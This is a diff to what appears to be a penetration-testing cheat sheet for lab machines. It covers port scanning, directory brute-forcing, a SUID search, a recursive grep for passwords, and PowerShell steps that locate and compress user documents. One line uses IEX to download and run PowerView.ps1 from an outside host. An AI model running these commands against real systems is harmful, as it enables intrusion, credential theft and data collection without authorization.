@@ -3,7 +3,7 @@
 ## vi
 
 ```sh
-kali@kali:/etc/vim$ cat /etc/vim/vimrc.local 
+cat /etc/vim/vimrc.local 
 set paste
 set cursorline
 set number
@@ -12,26 +12,27 @@ set number
 ## Enumeration 
 
 ```sh
-$ sudo masscan -p1-65535 10.10.10.77 --rate=1000 -e tun0 > ports
-$ ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')
-$ sudo nmap -Pn -sV -sC -p$ports 10.10.10.77 -oA nmap
+sudo masscan -p1-65535 10.10.10.77 --rate=1000 -e tun0 > ports
+ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')
+sudo nmap -Pn -sV -sC -p$ports 10.10.10.77 -oA nmap
 ```
 
 ## Web
 
 ```sh
-$ curl -v -X OPTIONS http://192.168.1.105/test
+curl -v -X OPTIONS http://192.168.1.105/test
 
-$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.php -u http://192.168.1.159:80 -o gob_common_80.txt
-$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -l -t 30 -e -k -x .html,.php -u http://192.168.1.159:80 -o go_medium_80.txt
+gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.php -u http://192.168.1.159:80 -o gob_common_80.txt
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -l -t 30 -e -k -x .html,.php -u http://192.168.1.159:80 -o go_medium_80.txt
 
-$ nikto -host 192.168.1.159:8080 | tee nikto_192.168.1.159_8080.txt
+nikto -host 192.168.1.159:8080 | tee nikto_192.168.1.159_8080.txt
 ```
 
 ## Find
 
 ```sh
-$ find / -perm -4000 2> /dev/null
+find / -perm -4000 2> /dev/null
+grep -iR "pass" * | more
 ```
 
 ## Powershell
@@ -73,30 +74,30 @@ $output="C:\Windows\System32\spool\drivers\color\SharpHound.exe"
 Reflective Downloading
 
 ```sh
-$ IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.7:9000/PowerView.ps1')
+IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.7:9000/PowerView.ps1')
 ```
 
 Size of Folder
 
 ```sh
-$ "{0} MB" -f ((Get-ChildItem C:\users\ -Recurse -force | Measure-Object -Property Length -Sum -ErrorAction Stop).Sum / 1MB)
+"{0} MB" -f ((Get-ChildItem C:\users\ -Recurse -force | Measure-Object -Property Length -Sum -ErrorAction Stop).Sum / 1MB)
 ```
 
 Compress
 
 ```sh
-$ Compress-Archive -LiteralPath <PathToFolder> -DestinationPath <PathToDestination>
+Compress-Archive -LiteralPath <PathToFolder> -DestinationPath <PathToDestination>
 ```
 Find Files
 
 ```sh
-$ gci -force -recurse -file -ea silentlycontinue  
+gci -force -recurse -file -ea silentlycontinue  
 
-$ Get-ChildItem -Path C:\ -Include *.doc,*.docx -File -Recurse -force -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\ -Include *.doc,*.docx -File -Recurse -force -ErrorAction SilentlyContinue
 
-$ FindDate=Get-Date -Year 2016 -Month 06 -Day 24
-$ Get-ChildItem -Path C:\ -Include *.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -ge $FindDate }
-$ Get-ChildItem -Path C:\ -Include *.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -ge $FindDate -and $_.LastWriteTime -le $Finddate.adddays(1) }
+FindDate=Get-Date -Year 2016 -Month 06 -Day 24
+Get-ChildItem -Path C:\ -Include *.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -ge $FindDate }
+Get-ChildItem -Path C:\ -Include *.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -ge $FindDate -and $_.LastWriteTime -le $Finddate.adddays(1) }
 ```
 
 ## Useful links
